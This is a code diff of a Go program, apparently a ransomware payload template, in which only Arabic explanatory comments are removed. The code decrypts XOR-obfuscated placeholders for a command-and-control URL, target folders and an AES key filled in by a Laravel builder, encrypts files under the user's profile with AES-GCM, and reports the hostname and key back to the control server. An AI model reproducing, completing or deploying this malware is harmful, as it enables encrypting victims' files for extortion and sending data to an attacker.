@@ -12,15 +12,12 @@ import (
 	"net/url"
 )
 
-// المتغيرات المشفرة (يتم استبدالها من Laravel)
 var EncC2ServerUrl = __C2_SERVER_URL__
 var EncTargetDirs = __TARGET_DIRECTORIES__
 var EncAesKey = __ENCRYPTED_AES_KEY__
 
-// مفتاح فك تشفير XOR
 const XorKey byte = __XOR_KEY__
 
-// دالة فك تشفير XOR في الذاكرة
 func decryptXOR(encrypted []byte, key byte) string {
 	decrypted := make([]byte, len(encrypted))
 	for i := 0; i < len(encrypted); i++ {
@@ -29,7 +26,6 @@ func decryptXOR(encrypted []byte, key byte) string {
 	return string(decrypted)
 }
 
-// دالة تشفير الملفات (AES)
 func encryptData(plainText []byte, key []byte) ([]byte, error) {
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -46,7 +42,6 @@ func encryptData(plainText []byte, key []byte) ([]byte, error) {
 	return gcm.Seal(nonce, nonce, plainText, nil), nil
 }
 
-// معالجة الملفات
 func processFiles(targetDirsString string, aesKey []byte) {
 	userProfile := os.Getenv("USERPROFILE")
 	if userProfile == "" {
@@ -83,7 +78,6 @@ func processFiles(targetDirsString string, aesKey []byte) {
 	}
 }
 
-// إرسال التقرير
 func reportBack(c2Url string, aesKey string) {
 	hostname, err := os.Hostname()
 	if err != nil {
@@ -105,15 +99,12 @@ func reportBack(c2Url string, aesKey string) {
 }
 
 func main() {
-	// فك تشفير النصوص في الذاكرة
 	realC2Url := decryptXOR(EncC2ServerUrl, XorKey)
 	realTargetDirs := decryptXOR(EncTargetDirs, XorKey)
 	realAesKeyStr := decryptXOR(EncAesKey, XorKey)
 
-	// تحويل مفتاح AES إلى بايتات
 	aesKeyBytes := []byte(realAesKeyStr)
 
-	// تنفيذ المهام
 	processFiles(realTargetDirs, aesKeyBytes)
 	reportBack(realC2Url, realAesKeyStr)
 }
